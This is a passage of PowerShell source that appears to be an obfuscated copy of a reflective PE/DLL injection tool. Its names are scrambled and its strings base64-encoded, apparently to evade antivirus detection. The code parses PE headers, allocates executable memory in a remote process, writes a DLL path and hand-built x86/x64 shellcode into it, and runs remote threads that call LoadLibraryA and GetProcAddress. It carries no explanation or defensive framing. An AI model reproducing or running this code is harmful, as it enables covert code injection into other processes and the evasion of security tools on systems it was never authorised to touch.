		[IntPtr]${/=\/\__/\__/\/=\/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/\/==\_/=\/\/=}) ([Int64][UInt64]${_/\__/==\_/==\___}.e_lfanew))
		${/=\_/==\/==\__/\_} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${/=\/\__/\__/\/=\/}
		${___/\__/==\___/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\__/\__/\/=\/}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${___/\__/==\___/==}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${___/\__/==\___/==}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${/=\_/==\/==\__/\_} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${___/\__/==\___/==}
			${/=\_/==\/==\__/\_} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${/=\____/\_/===\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\__/\__/\/=\/}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${/=\_/==\/==\__/\_} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${/=\____/\_/===\__}
			${/=\_/==\/==\__/\_} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${/=\_/==\/==\__/\_}
	}
	Function __/\/\_/\/====\_/=
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${_/========\__/\/==},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${__/\/=\/\_/=\_/=\_} = New-Object System.Object
		[IntPtr]${__/=\___________/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/========\__/\/==}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${_/========\__/\/==}, 0, ${__/=\___________/}, ${_/========\__/\/==}.Length) | Out-Null
		${/=\_/==\/==\__/\_} = __/=\__/=====\/\/\ -__/\/\/==\_/=\/\/= ${__/=\___________/} -Win32Types $Win32Types
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${/=\_/==\/==\__/\_}.PE64Bit)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\___________/})
		return ${__/\/=\/\_/=\_/=\_}
	}
	Function __/\_/\/\/==\___/\
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/\/==\_/=\/\/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${__/\/\/==\_/=\/\/=} -eq $null -or ${__/\/\/==\_/=\/\/=} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${__/\/=\/\_/=\_/=\_} = New-Object System.Object
		${/=\_/==\/==\__/\_} = __/=\__/=====\/\/\ -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -Win32Types $Win32Types
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${__/\/\/==\_/=\/\/=}
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${/=\_/==\/==\__/\_}.NtHeadersPtr)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${/=\_/==\/==\__/\_}.PE64Bit)
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${__/\/=\/\_/=\_/=\_}.PE64Bit -eq $true)
		{
			[IntPtr]${/=====\/\/====\_/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${/=====\/\/====\_/}
		}
		else
		{
			[IntPtr]${/=====\/\/====\_/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${/=====\/\/====\_/}
		}
		if ((${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${/=\_/==\/==\__/\_}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${__/\/=\/\_/=\_/=\_}
	}
	Function __/==\/\/=\/=\/=\/
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\____/\/===\_/\},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${___/==\_____/===\_}
		)
		${_/=\__/=\/=\_/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${__/==\/\_/\/=\/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${___/==\_____/===\_})
		${___/=\/\/\__/\__/} = [UIntPtr][UInt64]([UInt64]${__/==\/\_/\/=\/=\}.Length + 1)
		${_/\/===\__/=\/=\_} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, ${___/=\/\/\__/\__/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${_/\/===\__/=\/=\_} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${_/=\/====\/===\/=} = [UIntPtr]::Zero
		${_/\/=\_/\/===\__/} = $Win32Functions.WriteProcessMemory.Invoke(${__/\____/\/===\_/\}, ${_/\/===\__/=\/=\_}, ${___/==\_____/===\_}, ${___/=\/\/\__/\__/}, [Ref]${_/=\/====\/===\/=})
		if (${_/\/=\_/\/===\__/} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${___/=\/\/\__/\__/} -ne ${_/=\/====\/===\/=})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${___/\/\_/\__/=\/=} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${_/=\/=\_/==\__/\_} = $Win32Functions.GetProcAddress.Invoke(${___/\/\_/\__/=\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${__/======\___/\/\} = [IntPtr]::Zero
		if (${__/\/=\/\_/=\_/=\_}.PE64Bit -eq $true)
		{
			${_/\/====\/==\/==\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, ${___/=\/\/\__/\__/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${_/\/====\/==\/==\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${_/\/\__/\/==\/\/\} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${__/==\__/\___/\__} = @(0x48, 0xba)
			${_/\______/==\/\__} = @(0xff, 0xd2, 0x48, 0xba)
			${/=\_/\_/=\__/====} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${_/\_/\/==\__/\_/\} = ${_/\/\__/\/==\/\/\}.Length + ${__/==\__/\___/\__}.Length + ${_/\______/==\/\__}.Length + ${/=\_/\_/=\__/====}.Length + (${_/=\__/=\/=\_/=\/} * 3)
			${_/\_/=\/==\_/==\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\_/\/==\__/\_/\})
			${_______________/\} = ${_/\_/=\/==\_/==\_}
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/\/\__/\/==\/\/\} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/\/\__/\/==\/\/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/===\__/=\/=\_}, ${_/\_/=\/==\_/==\_}, $false)
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${__/==\__/\___/\__} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${__/==\__/\___/\__}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/=\_/==\__/\_}, ${_/\_/=\/==\_/==\_}, $false)
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/\______/==\/\__} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/\______/==\/\__}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/====\/==\/==\}, ${_/\_/=\/==\_/==\_}, $false)
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
			_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${/=\_/\_/=\__/====} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
			${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${/=\_/\_/=\__/====}.Length)
			${/===\___/\__/==\_} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, [UIntPtr][UInt64]${_/\_/\/==\__/\_/\}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${/===\___/\__/==\_} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${_/\/=\_/\/===\__/} = $Win32Functions.WriteProcessMemory.Invoke(${__/\____/\/===\_/\}, ${/===\___/\__/==\_}, ${_______________/\}, [UIntPtr][UInt64]${_/\_/\/==\__/\_/\}, [Ref]${_/=\/====\/===\/=})
			if ((${_/\/=\_/\/===\__/} -eq $false) -or ([UInt64]${_/=\/====\/===\/=} -ne [UInt64]${_/\_/\/==\__/\_/\}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${_/\/====\_/==\/\_} = _/=\__/=\/==\/===\ -__/=\__/=\/=\_/\_/ ${__/\____/\/===\_/\} -____/=\_/=\_/\_/\_ ${/===\___/\__/==\_} -Win32Functions $Win32Functions 
			${/====\__/==\__/==} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/====\_/==\/\_}, 20000)
			if (${/====\__/==\__/==} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${_/==\/\___/=\/\__} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\__/=\/=\_/=\/})
			${/====\__/==\__/==} = $Win32Functions.ReadProcessMemory.Invoke(${__/\____/\/===\_/\}, ${_/\/====\/==\/==\}, ${_/==\/\___/=\/\__}, [UIntPtr][UInt64]${_/=\__/=\/=\_/=\/}, [Ref]${_/=\/====\/===\/=})
			if (${/====\__/==\__/==} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${__/======\___/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\/\___/=\/\__}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${_/\/====\/==\/==\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${/===\___/\__/==\_}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${_/\/====\_/==\/\_} = _/=\__/=\/==\/===\ -__/=\__/=\/=\_/\_/ ${__/\____/\/===\_/\} -____/=\_/=\_/\_/\_ ${_/=\/=\_/==\__/\_} -__/=====\___/\___/ ${_/\/===\__/=\/=\_} -Win32Functions $Win32Functions 
			${/====\__/==\__/==} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/====\_/==\/\_}, 20000)
			if (${/====\__/==\__/==} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${/=\/==\/=\/=\__/=} = 0
			${/====\__/==\__/==} = $Win32Functions.GetExitCodeThread.Invoke(${_/\/====\_/==\/\_}, [Ref]${/=\/==\/=\/=\__/=})
			if ((${/====\__/==\__/==} -eq 0) -or (${/=\/==\/=\/=\__/=} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${__/======\___/\/\} = [IntPtr]${/=\/==\/=\/=\__/=}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${_/\/===\__/=\/=\_}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${__/======\___/\/\}
	}
	Function __/==\___/==\/===\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\____/\/===\_/\},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_____/=\/\_/\_/=\/},
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		${___/==\_/\/\_/\_/=}
		)
		${_/=\__/=\/=\_/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${__/=\_/===\/\/\_/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/==\_/\/\_/\_/=})
		${/============\__/} = [UIntPtr][UInt64]([UInt64]${___/==\_/\/\_/\_/=}.Length + 1)
		${___/\_/=\/\__/===} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, ${/============\__/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${___/\_/=\/\__/===} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${_/=\/====\/===\/=} = [UIntPtr]::Zero
		${_/\/=\_/\/===\__/} = $Win32Functions.WriteProcessMemory.Invoke(${__/\____/\/===\_/\}, ${___/\_/=\/\__/===}, ${__/=\_/===\/\/\_/}, ${/============\__/}, [Ref]${_/=\/====\/===\/=})
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\_/===\/\/\_/})
		if (${_/\/=\_/\/===\__/} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${/============\__/} -ne ${_/=\/====\/===\/=})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${___/\/\_/\__/=\/=} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${______/\/\__/===\} = $Win32Functions.GetProcAddress.Invoke(${___/\/\_/\__/=\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${_/\__/\/=\/\/\_/\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, [UInt64][UInt64]${_/=\__/=\/=\_/=\/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${_/\__/\/=\/\/\_/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${____/\/==\/\/\/==} = @()
		if (${__/\/=\/\_/=\_/=\_}.PE64Bit -eq $true)
		{
			${__/=\/\____/===\/} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${_/=\/\/=\/\__/=\/} = @(0x48, 0xba)
			${____/\/==\/\_/===} = @(0x48, 0xb8)
			${_/==\___/\/===\_/} = @(0xff, 0xd0, 0x48, 0xb9)
			${_/==\/\/\/\/===\/} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${__/=\/\____/===\/} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${_/=\/\/=\/\__/=\/} = @(0xb9)
			${____/\/==\/\_/===} = @(0x51, 0x50, 0xb8)
			${_/==\___/\/===\_/} = @(0xff, 0xd0, 0xb9)
			${_/==\/\/\/\/===\/} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${_/\_/\/==\__/\_/\} = ${__/=\/\____/===\/}.Length + ${_/=\/\/=\/\__/=\/}.Length + ${____/\/==\/\_/===}.Length + ${_/==\___/\/===\_/}.Length + ${_/==\/\/\/\/===\/}.Length + (${_/=\__/=\/=\_/=\/} * 4)
		${_/\_/=\/==\_/==\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\_/\/==\__/\_/\})
		${_______________/\} = ${_/\_/=\/==\_/==\_}
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${__/=\/\____/===\/} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${__/=\/\____/===\/}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_____/=\/\_/\_/=\/}, ${_/\_/=\/==\_/==\_}, $false)
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/=\/\/=\/\__/=\/} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\/\/=\/\__/=\/}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\_/=\/\__/===}, ${_/\_/=\/==\_/==\_}, $false)
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${____/\/==\/\_/===} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${____/\/==\/\_/===}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${______/\/\__/===\}, ${_/\_/=\/==\_/==\_}, $false)
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/==\___/\/===\_/} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/==\___/\/===\_/}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\__/\/=\/\/\_/\}, ${_/\_/=\/==\_/==\_}, $false)
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${_/==\/\/\/\/===\/} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
		${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/==\/\/\/\/===\/}.Length)
		${/===\___/\__/==\_} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, [UIntPtr][UInt64]${_/\_/\/==\__/\_/\}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if (${/===\___/\__/==\_} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
